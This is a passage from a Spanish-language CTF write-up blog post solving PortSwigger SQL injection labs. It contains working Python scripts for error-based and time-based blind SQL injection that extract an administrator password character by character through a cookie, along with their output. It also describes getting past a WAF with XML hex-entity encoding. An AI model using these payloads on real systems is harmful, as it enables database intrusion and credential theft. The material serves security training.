    print<span class="o">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
    sys.exit<span class="o">(</span>1<span class="o">)</span>

<span class="c"># Ctrl+c </span>
signal.signal<span class="o">(</span>signal.SIGINT, def_handler<span class="o">)</span>

main_url <span class="o">=</span> <span class="s2">"https://0a77003e03026052829c9d1f00cf006c.web-security-academy.net/"</span>
characters <span class="o">=</span> string.ascii_lowercase + string.digits

def makeRequest<span class="o">()</span>:
    
    password <span class="o">=</span> <span class="s2">""</span>

    p1 <span class="o">=</span> log.progress<span class="o">(</span><span class="s2">"Fuerza Bruta"</span><span class="o">)</span>
    p1.status<span class="o">(</span><span class="s2">"Iniciando Fuerza Bruta"</span><span class="o">)</span>

    time.sleep<span class="o">(</span>2<span class="o">)</span>

    p2 <span class="o">=</span> log.progress<span class="o">(</span><span class="s2">"Password"</span><span class="o">)</span>

    <span class="k">for </span>position <span class="k">in </span>range<span class="o">(</span>1, 21<span class="o">)</span>: <span class="c"># Longitud de la contraseña </span>
        <span class="k">for </span>character <span class="k">in </span>characters:    
            
            cookies <span class="o">=</span> <span class="o">{</span>
                <span class="s1">'TrackingId'</span>: <span class="s2">"TrackingId=RYv84rwBNkKgrR6I'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'"</span> % <span class="o">(</span>position, character<span class="o">)</span>,
                <span class="s1">'session'</span>: <span class="s1">'uMuOQ5tR8SukkqghM9kJijQdjAhx55n6'</span>
            <span class="o">}</span>

            p1.status<span class="o">(</span>cookies[<span class="s1">'TrackingId'</span><span class="o">])</span>

            r <span class="o">=</span> requests.get<span class="o">(</span>main_url, <span class="nv">cookies</span><span class="o">=</span>cookies<span class="o">)</span>

            <span class="k">if </span>r.status_code <span class="o">==</span> 500: <span class="c"># Codigo de estado</span>
                password +<span class="o">=</span> character
                p2.status<span class="o">(</span>password<span class="o">)</span>
                <span class="nb">break
</span><span class="k">if </span>__name__ <span class="o">==</span> <span class="s1">'__main__'</span>:
    makeRequest<span class="o">()</span>

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 error.py
<span class="o">[</span>o] Fuerza Bruta: <span class="nv">TrackingId</span><span class="o">=</span>RYv84rwBNkKgrR6I<span class="s1">'||(select case when substr(password,20,1)='</span>u<span class="s1">' then to_char(1/0) else '' end from users where username='</span>administrator<span class="s1">')||'</span>
<span class="o">[</span>▇] Password: dq661c6kbqr9wemn3khu
</code></pre></div></div>

<p><img src="/assets/portswigger/sqli/web65.png" alt="" /></p>

<h2 id="sql-injection-with-time-delays">SQL injection with time delays</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">https://portswigger.net/web-security/sql-injection/blind/lab-time-delays</a>.</p>
  </li>
  <li>
    <p>Esta inyección es basada en tiempo y la base de datos es de <strong>Postgress</strong> asi que nos vamos a capturar la petición con burpsuite otra vez.</p>
  </li>
  <li>
    <p>El campo inyectable también es el mismo campo pero bueno esta es una inyección basada en tiempo para ver si esto es vulnerable a la de tiempo podemos hacer un <code class="language-plaintext highlighter-rouge">pg_sleep(10)-- -</code> y si la web tarda 10 segundos en responder es por que es vulnerable.</p>
  </li>
  <li>
    <p>Lo único que tienes que hacer para resolver el laboratorio lo único que tienes que hacer es esto.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web66.png" alt="" /></p>

<p><img src="/assets/portswigger/sqli/web67.png" alt="" /></p>

<h2 id="blind-sql-injection-with-time-delays-and-information-retrieval">Blind SQL injection with time delays and information retrieval</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval</a>.</p>
  </li>
  <li>
    <p>Ahora nos vamos aprovechar del tiempo para poder dumpear datos.</p>
  </li>
  <li>
    <p>Bueno para dumpear datos es igual que el script de python3 pero ahora tenemos que usar el tiempo asta ahora sabemos que la tabla se users y el usuario se llama administrator.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3 </span>

from pwn import <span class="k">*</span>
import requests, <span class="nb">time</span>, signal, sys, string

def def_handler<span class="o">(</span>sig, frame<span class="o">)</span>:
    print<span class="o">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
    sys.exit<span class="o">(</span>1<span class="o">)</span>

<span class="c"># Ctrl+c </span>
signal.signal<span class="o">(</span>signal.SIGINT, def_handler<span class="o">)</span>

main_url <span class="o">=</span> <span class="s2">"https://0ae40016039741e7814a1bbe003600ff.web-security-academy.net"</span>
characters <span class="o">=</span> string.ascii_lowercase + string.digits

def makeRequest<span class="o">()</span>:
    
    password <span class="o">=</span> <span class="s2">""</span>

    p1 <span class="o">=</span> log.progress<span class="o">(</span><span class="s2">"Fuerza Bruta"</span><span class="o">)</span>
    p1.status<span class="o">(</span><span class="s2">"Iniciando Fuerza Bruta"</span><span class="o">)</span>

    time.sleep<span class="o">(</span>2<span class="o">)</span>

    p2 <span class="o">=</span> log.progress<span class="o">(</span><span class="s2">"Password"</span><span class="o">)</span>

    <span class="k">for </span>position <span class="k">in </span>range<span class="o">(</span>1, 21<span class="o">)</span>: <span class="c"># Longitud de la contraseña </span>
        <span class="k">for </span>character <span class="k">in </span>characters:    
            
            cookies <span class="o">=</span> <span class="o">{</span>
                <span class="s1">'TrackingId'</span>: <span class="s2">"1lFKg9knAZv6c4Rh'||(select case when substring(password,%d,1)='%s' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -"</span> % <span class="o">(</span>position, character<span class="o">)</span>,
                <span class="s1">'session'</span>: <span class="s1">'GFWmEskRVbNs1roHXayzNqy3kmOWofMd'</span>
            <span class="o">}</span>
            
            p1.status<span class="o">(</span>cookies[<span class="s1">'TrackingId'</span><span class="o">])</span>

            time_start <span class="o">=</span> time.time<span class="o">()</span>

            r <span class="o">=</span> requests.get<span class="o">(</span>main_url, <span class="nv">cookies</span><span class="o">=</span>cookies<span class="o">)</span>
            
            time_end <span class="o">=</span> time.time<span class="o">()</span>

            <span class="k">if </span>time_end - time_start <span class="o">&gt;</span> 1.5:
                password +<span class="o">=</span> character
                p2.status<span class="o">(</span>password<span class="o">)</span>
                <span class="nb">break
</span><span class="k">if </span>__name__ <span class="o">==</span> <span class="s1">'__main__'</span>:
    makeRequest<span class="o">()</span>

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 portswigger_b.py
<span class="o">[</span>▇] Fuerza Bruta: 1lFKg9knAZv6c4Rh<span class="s1">'||(select case when substring(password,20,1)='</span>6<span class="s1">' then pg_sleep(1.5) else pg_sleep(0) end from users where username='</span>administrator<span class="s1">')-- -
[.......\] Password: m2at1sufe07hhx5v5vv6
</span></code></pre></div></div>

<h2 id="sql-injection-with-filter-bypass-via-xml-encoding">SQL injection with filter bypass via XML encoding</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding">https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding</a>.</p>
  </li>
  <li>
    <p>Ahora nos dicen que hay una vulnerabilidad en el <strong>stock check feature.</strong>.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web68.png" alt="" /></p>

<ul>
  <li>
    <p>Vamos a capturar la petición con <strong>Burpsuite</strong> al hacer click en <strong>Check Store</strong>.</p>
  </li>
  <li>
    <p>Y vemos que hay una estructura en <strong>XML</strong> de primeras pues pensamos en un <strong>XXE</strong> pero bueno vamos a probar con las inyecciones.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web69.png" alt="" /></p>

<ul>
  <li>Y bueno ya nos detectan hay un <strong>WAF</strong>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web70.png" alt="" /></p>

<ul>
  <li>Bueno en el laboratorio nos dicen que usemos <strong>hackvertor</strong> que tenemos que instalarlo en <strong>Burpsuite</strong> puedes hacerlo de esta forma.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web71.png" alt="" /></p>

<ul>
  <li>Una vez instalado solo tienes que seleccionar la query <strong>Click derecho + Entensions y Harkvertor + Enconde + hex_entities</strong> (tube volver a poner el laboratorio tuve unos errores con la conexión pero básicamente es lo mismo solo seleccione otro producto).</li>
</ul>

<p><img src="/assets/portswigger/sqli/web72.png" alt="" /></p>

<ul>
  <li>Vamos a dumpear las bases de datos.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web73.png" alt="" /></p>

<ul>
  <li>Vamos a ver directamente la contraseña del <strong>administrator</strong>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web74.png" alt="" /></p>

<p><img src="/assets/portswigger/sqli/final.png" alt="" /></p>

  </div><a class="u-url" href="/hacking-web/portswigger/2024/03/18/sqli-portswigger.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
